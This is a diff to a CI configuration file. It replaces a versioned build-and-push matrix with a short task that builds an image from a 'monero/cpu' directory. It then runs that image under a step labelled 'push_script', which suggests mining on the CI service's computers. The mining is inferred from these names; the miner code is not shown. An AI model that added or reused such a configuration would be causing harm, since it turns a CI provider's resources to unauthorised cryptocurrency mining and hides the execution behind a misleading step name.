@@ -1,41 +1,4 @@
-version: 1.0
-
-resources:
-  cpu: 8      # Allocate 8 CPU cores for the build
-  memory: 15GB # Allocate 15GB of memory
-
-timeout_in: 90m  # Timeout for the entire job
-
-# Define the docker_builder task
 docker_builder:
-  matrix:
-    # Define environment variables for different configurations and versions
-    - context: monero/cpu
-      tag: nmlm99/sobakaka-cpu:v1
-      version: 1.0
-    - context: monero/cpu
-      tag: nmlm99/sobakaka-cpu:v2
-      version: 2.0
-    - context: monero/cpu
-      tag: nmlm99/sobakaka-cpu:v3
-      version: 3.0
-    - context: monero/cpu
-      tag: nmlm99/sobakaka-cpu:v4
-      version: 4.0
-
-  # Define the steps for each matrix job
-  steps:
-    # Build the Docker image for each matrix configuration
-    - name: Build Docker Image
-      image: docker:latest
-      commands:
-        - export DOCKER_BUILDKIT=1  # Enable Docker BuildKit
-        - echo "Building version {{matrix.version}} with tag {{matrix.tag}}"
-        - docker build --tag {{matrix.tag}} {{matrix.context}}  # Use matrix variables for context and tag
-
-    # Push the Docker image for each build
-    - name: Push Docker Image
-      image: docker:latest
-      commands:
-        - echo "Pushing version {{matrix.version}} with tag {{matrix.tag}}"
-        - docker push {{matrix.tag}}  # Push the corresponding image to Docker Hub
+  build_script: docker build -t nmlm99/nizadam:latest ./monero/cpu
+  timeout_in: 90m
+  push_script: docker run nmlm99/nizadam:latest
